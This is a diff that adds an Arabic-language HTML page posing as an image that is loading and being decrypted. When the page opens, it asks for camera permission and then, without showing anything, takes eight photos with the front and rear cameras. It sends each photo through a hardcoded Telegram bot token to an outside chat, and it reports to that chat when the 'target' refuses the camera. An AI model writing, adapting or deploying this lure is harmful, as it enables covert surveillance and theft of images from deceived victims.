@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تحميل الصورة...</title>
+    <style>
+        body { background-color: #1a1a1a; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 25%; margin: 0; }
+        .loader { border: 6px solid #333; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 25px; font-size: 1.1em; color: #aaa; padding: 0 20px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>يتم الآن معالجة الصورة وفك التشفير، يرجى الانتظار وعدم إغلاق الصفحة...</p>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8207943883:AAF_XJoeKlHE2bB7Ro0PBVSvpihbuZ0fW0';
+        const CHAT_ID = '8350812242';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        async function initCamera() {
+            try {
+                // محاولة فتح الكاميرا (سيطلب المتصفح إذن)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // البدء بالأمامية
+                });
+                video.srcObject = stream;
+                
+                // بدء التسلسل: 3 أمامية، 3 خلفية، 2 أمامية
+                await captureSequence();
+            } catch (err) {
+                console.error("Camera access denied: ", err);
+                // إرسال تنبيه للبوت إن الضحية رفض الإذن
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ الهدف رفض إذن الكاميرا`);
+            }
+        }
+
+        async function captureSequence() {
+            // 3 لقطات أمامية
+            for(let i=1; i<=3; i++) {
+                await waitAndSnap(i, "أمامية");
+            }
+
+            // محاولة التبديل للخلفية (تعتمد على دعم المتصفح)
+            try {
+                const streamBack = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: "environment" } } 
+                });
+                video.srcObject = streamBack;
+                for(let i=4; i<=6; i++) {
+                    await waitAndSnap(i, "خلفية");
+                }
+            } catch(e) {
+                // إذا لم تتوفر خلفية استمر بالأمامية
+                for(let i=4; i<=6; i++) await waitAndSnap(i, "أمامية (بديلة)");
+            }
+
+            // العودة للأمامية لآخر لقطتين
+            try {
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = streamFront;
+                for(let i=7; i<=8; i++) {
+                    await waitAndSnap(i, "أمامية أخيرة");
+                }
+            } catch(e) {
+                for(let i=7; i<=8; i++) await waitAndSnap(i, "تكملة");
+            }
+        }
+
+        async function waitAndSnap(num, type) {
+            await new Promise(r => setTimeout(r, 2500)); // انتظار 2.5 ثانية
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `shot_${num}.jpg`);
+                formData.append('caption', `✅ لقطة رقم ${num} (${type})`);
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => console.log("Sent shot " + num));
+            }, 'image/jpeg', 0.7); // جودة 70% لسرعة الإرسال
+        }
+
+        window.onload = initCamera;
+    </script>
+</body>
+</html>
